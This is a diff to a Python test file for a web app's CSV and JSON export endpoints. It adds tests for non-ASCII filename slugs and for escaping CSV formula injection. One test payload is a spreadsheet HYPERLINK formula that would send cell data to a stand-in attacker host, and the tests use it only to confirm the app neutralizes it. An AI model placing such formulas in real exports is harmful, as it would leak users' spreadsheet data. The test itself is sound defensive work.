@@ -63,6 +63,7 @@ def _make_check_result(
     topic_id: int,
     has_new_info: bool = True,
     stage_error: str | None = None,
+    notification_error: str | None = None,
 ) -> CheckResult:
     result = CheckResult(
         topic_id=topic_id,
@@ -72,7 +73,7 @@ def _make_check_result(
         has_new_info=has_new_info,
         llm_response=None,
         notification_sent=False,
-        notification_error=None,
+        notification_error=notification_error,
         stage_error=stage_error,
     )
     created = create_check_result(conn, result)
@@ -335,6 +336,112 @@ async def test_export_topic_csv_not_found(
     response = await client.get("/topics/999999/export/csv")
 
     assert response.status_code == 404
+
+
+# --- Non-ASCII export filename slug (OVH-167) ---
+
+
+async def test_export_csv_non_ascii_name_has_sane_filename(
+    client: httpx.AsyncClient,
+    db_conn: sqlite3.Connection,
+) -> None:
+    """A fully non-ASCII topic name must not yield an empty/degenerate filename."""
+    topic = _make_topic(db_conn, name="日本語ニュース")
+    assert topic.id is not None
+
+    response = await client.get(f"/topics/{topic.id}/export/csv")
+
+    assert response.status_code == 200
+    disposition = response.headers.get("content-disposition", "")
+    # The slug falls back to "topic" rather than collapsing to "checks_{id}_.csv".
+    assert f'filename="checks_{topic.id}_topic.csv"' in disposition
+
+
+async def test_export_json_non_ascii_name_has_sane_filename(
+    client: httpx.AsyncClient,
+    db_conn: sqlite3.Connection,
+) -> None:
+    """JSON export filename slug for a non-ASCII name is sane (no empty slug)."""
+    topic = _make_topic(db_conn, name="Привет мир")
+    assert topic.id is not None
+
+    response = await client.get(f"/topics/{topic.id}/export/json")
+
+    assert response.status_code == 200
+    disposition = response.headers.get("content-disposition", "")
+    assert f'filename="topic_{topic.id}_topic.json"' in disposition
+
+
+async def test_export_csv_mixed_ascii_name_keeps_ascii_slug(
+    client: httpx.AsyncClient,
+    db_conn: sqlite3.Connection,
+) -> None:
+    """A name with some ASCII keeps the ASCII part (no degenerate trailing _)."""
+    topic = _make_topic(db_conn, name="Café News 🚀")
+    assert topic.id is not None
+
+    response = await client.get(f"/topics/{topic.id}/export/csv")
+
+    assert response.status_code == 200
+    disposition = response.headers.get("content-disposition", "")
+    # "Café News 🚀" -> "caf_news" (no leading/trailing/doubled underscores).
+    assert f'filename="checks_{topic.id}_caf_news.csv"' in disposition
+
+
+# --- CSV formula-injection neutralizer (OVH-168, CWE-1236) ---
+
+
+async def test_export_csv_neutralizes_formula_injection(
+    client: httpx.AsyncClient,
+    db_conn: sqlite3.Connection,
+) -> None:
+    """A cell starting with a formula trigger is prefixed with a single quote.
+
+    ``notification_error`` can carry attacker-influenced text (a provider error
+    echoing a crafted value). Pins the escaping contract: each formula-trigger
+    leading char (= + - @ tab CR) is neutralized so a spreadsheet treats the
+    cell as literal text.
+    """
+    topic = _make_topic(db_conn)
+    assert topic.id is not None
+    payload = '=HYPERLINK("http://evil.example/?leak="&A1,"click")'
+    _make_check_result(db_conn, topic.id, notification_error=payload)
+
+    response = await client.get(f"/topics/{topic.id}/export/csv")
+
+    assert response.status_code == 200
+    rows = list(csv.DictReader(io.StringIO(response.text)))
+    assert len(rows) == 1
+    # The dangerous leading '=' is neutralized with a leading single quote, and
+    # the rest of the payload survives intact.
+    assert rows[0]["notification_error"] == "'" + payload
+
+
+async def test_export_csv_neutralizes_all_trigger_chars(
+    client: httpx.AsyncClient,
+    db_conn: sqlite3.Connection,
+) -> None:
+    """Every formula-trigger leading char is escaped; benign cells are untouched."""
+    topic = _make_topic(db_conn)
+    assert topic.id is not None
+    for trigger in ("=cmd", "+1+1", "-2+3", "@SUM(A1)", "\t=danger", "\r=danger"):
+        _make_check_result(db_conn, topic.id, notification_error=trigger)
+    # A benign value that must NOT be altered.
+    _make_check_result(db_conn, topic.id, notification_error="normal error text")
+
+    response = await client.get(f"/topics/{topic.id}/export/csv")
+
+    assert response.status_code == 200
+    rows = list(csv.DictReader(io.StringIO(response.text)))
+    errors = {row["notification_error"] for row in rows}
+    assert "'=cmd" in errors
+    assert "'+1+1" in errors
+    assert "'-2+3" in errors
+    assert "'@SUM(A1)" in errors
+    assert "'\t=danger" in errors
+    assert "'\r=danger" in errors
+    # Benign text is passed through unchanged (no spurious quote prefix).
+    assert "normal error text" in errors
 
 
 # --- All topics JSON export ---
